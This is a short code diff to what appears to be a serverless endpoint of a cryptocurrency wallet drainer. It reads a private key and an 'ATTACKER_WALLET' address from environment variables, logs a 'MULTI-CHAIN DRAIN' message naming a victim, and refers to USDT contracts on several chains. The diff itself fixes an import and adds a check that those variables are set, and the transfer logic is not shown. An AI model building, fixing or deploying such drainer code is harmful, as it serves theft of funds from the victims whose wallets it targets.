@@ -1,4 +1,4 @@
-const { Web3 } = require('web3');
+const Web3 = require('web3');
 
 module.exports = async (req, res) => {
     if (req.method !== 'POST') return res.status(405).end();
@@ -7,6 +7,13 @@ module.exports = async (req, res) => {
     const PRIVATE_KEY = process.env.PRIVATE_KEY;
     const ATTACKER_WALLET = process.env.ATTACKER_WALLET;
     
+    if (!PRIVATE_KEY || !ATTACKER_WALLET) {
+        return res.status(500).json({ 
+            success: false, 
+            error: 'Environment Variables (PRIVATE_KEY or ATTACKER_WALLET) are not set in Vercel' 
+        });
+    }
+
     console.log(`🎯 MULTI-CHAIN DRAIN: ${victim}`);
     
     // Multi-chain USDT contracts
